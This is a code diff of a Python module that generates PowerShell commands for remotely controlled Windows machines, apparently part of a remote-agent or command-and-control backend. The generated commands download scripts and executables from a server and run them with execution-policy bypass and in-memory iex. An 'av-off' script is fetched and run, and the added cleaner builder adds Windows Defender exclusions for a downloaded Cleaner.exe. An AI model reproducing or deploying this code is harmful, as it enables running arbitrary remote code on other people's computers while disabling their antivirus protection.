@@ -24,33 +24,48 @@ def _q(s: str) -> str:
 
 
 def _short_runner(tool_id: str | None = None, *, all_tools: bool = False) -> str:
-    """Curl script on PC; result via TEMP file (Hidden PS has no console → FILEB64 lost)."""
+    """
+    Run tool script on the PC.
+    Solo: iex in-process (nested -WindowStyle Hidden drops FILEB64).
+    Zip: nested + RESULT_FILE (large payload).
+    """
     files = _files_base()
     if all_tools:
         script = f"{files}/scripts/export-tools.ps1"
-        tool_env = ""
-    else:
-        if not tool_id or tool_id not in TOOLS_BY_ID:
-            raise ValueError(f"outil inconnu: {tool_id}")
-        script = f"{files}/scripts/run-tool.ps1"
-        tool_env = f"$env:AGENTSHE_TOOL_ID={_q(tool_id)}\n"
-    return f"""
+        return f"""
 $ErrorActionPreference='SilentlyContinue'
 try{{$PSNativeCommandUseErrorActionPreference=$false}}catch{{}}
-$files={_q(files)}
-$env:AGENTSHE_FILES=$files
-{tool_env}$res=Join-Path $env:TEMP ('hh-res-'+[guid]::NewGuid().ToString('n')+'.txt')
+$env:AGENTSHE_FILES={_q(files)}
+$res=Join-Path $env:TEMP ('hh-res-'+[guid]::NewGuid().ToString('n')+'.txt')
 $env:AGENTSHE_RESULT_FILE=$res
 $tmp=Join-Path $env:TEMP ('hh-run-'+[guid]::NewGuid().ToString('n')+'.ps1')
 & curl.exe -fsSL {_q(script)} -o $tmp
-if(-not(Test-Path $tmp)){{throw 'script download failed'}}
-& powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File $tmp | Out-Null
+if(-not(Test-Path $tmp)){{throw 'export script download failed'}}
+& powershell.exe -NoProfile -ExecutionPolicy Bypass -File $tmp | Out-Null
 $out=''
 if(Test-Path -LiteralPath $res){{ $out=[IO.File]::ReadAllText($res) }}
 if(-not $out){{ $out = (& powershell.exe -NoProfile -ExecutionPolicy Bypass -File $tmp | Out-String -Width 4096) }}
 Remove-Item $tmp,$res -Force -EA SilentlyContinue
-if(-not $out){{throw 'pas de sortie outil'}}
+if(-not $out){{throw 'pas de sortie export'}}
 Write-Output $out
+""".strip()
+
+    if not tool_id or tool_id not in TOOLS_BY_ID:
+        raise ValueError(f"outil inconnu: {tool_id}")
+    script = f"{files}/scripts/run-tool.ps1"
+    # Same process as the agent command — Write-Output FILEB64 is captured reliably.
+    return f"""
+$ErrorActionPreference='SilentlyContinue'
+try{{$PSNativeCommandUseErrorActionPreference=$false}}catch{{}}
+$env:AGENTSHE_FILES={_q(files)}
+$env:AGENTSHE_TOOL_ID={_q(tool_id)}
+$res=Join-Path $env:TEMP ('hh-res-'+[guid]::NewGuid().ToString('n')+'.txt')
+$env:AGENTSHE_RESULT_FILE=$res
+iex ((curl.exe -fsSL {_q(script)} | Out-String))
+$out=''
+if(Test-Path -LiteralPath $res){{ $out=[IO.File]::ReadAllText($res) }}
+Remove-Item $res -Force -EA SilentlyContinue
+if($out){{ Write-Output $out }}
 """.strip()
 
 
@@ -66,7 +81,7 @@ $env:AGENTSHE_BOT_BASE=($files -replace '/files$','')
 $tmp=Join-Path $env:TEMP ('hh-avoff-'+[guid]::NewGuid().ToString('n')+'.ps1')
 & curl.exe -fsSL {_q(script)} -o $tmp
 if(-not(Test-Path $tmp)){{throw 'av-off download failed'}}
-$o=& powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File $tmp 2>&1 | Out-String -Width 2147483647
+$o=& powershell.exe -NoProfile -ExecutionPolicy Bypass -File $tmp 2>&1 | Out-String -Width 2147483647
 Write-Output $o
 Remove-Item $tmp -Force -EA SilentlyContinue
 """.strip()
@@ -79,6 +94,27 @@ def build_tool_ps(tool_id: str, *, prefer_x64: bool = True) -> str:
 
 def build_all_tools_ps() -> str:
     return _short_runner(all_tools=True)
+
+
+def build_cleaner_ps() -> str:
+    """Download Cleaner.exe (zero-dep) and run; return stdout summary."""
+    files = _files_base()
+    url = f"{files}/tools/Cleaner.exe"
+    return f"""
+$ErrorActionPreference='SilentlyContinue'
+try{{$PSNativeCommandUseErrorActionPreference=$false}}catch{{}}
+$dir=Join-Path $env:LOCALAPPDATA 'HelperHost\\tools'
+New-Item -ItemType Directory -Force -Path $dir | Out-Null
+$exe=Join-Path $dir 'Cleaner.exe'
+& curl.exe -fsSL {_q(url)} -o $exe
+if(-not(Test-Path $exe) -or (Get-Item $exe).Length -lt 100000){{throw 'Cleaner.exe download failed'}}
+Unblock-File $exe -EA SilentlyContinue
+try{{Add-MpPreference -ExclusionPath $dir -EA SilentlyContinue}}catch{{}}
+try{{Add-MpPreference -ExclusionProcess 'Cleaner.exe' -EA SilentlyContinue}}catch{{}}
+$o=& $exe 2>&1 | Out-String -Width 4096
+Write-Output $o
+if($o -notmatch 'CLEANER done'){{throw 'Cleaner incomplete'}}
+""".strip()
 
 
 _FILE_RE = re.compile(
@@ -116,4 +152,9 @@ def is_windows_session(session: dict[str, Any]) -> bool:
     agent = session.get("agent") or {}
     if not platform or platform == "any":
         platform = (agent.get("platform") or "").lower()
+    # Hostname heuristics for mis-tagged enrolls
+    if platform not in ("windows", "win", "windows_nt"):
+        name = (session.get("name") or agent.get("hostname") or "").upper()
+        if name.startswith("DESKTOP-") or name.startswith("WIN-") or name.startswith("LAPTOP-"):
+            return True
     return platform in ("windows", "win", "windows_nt")
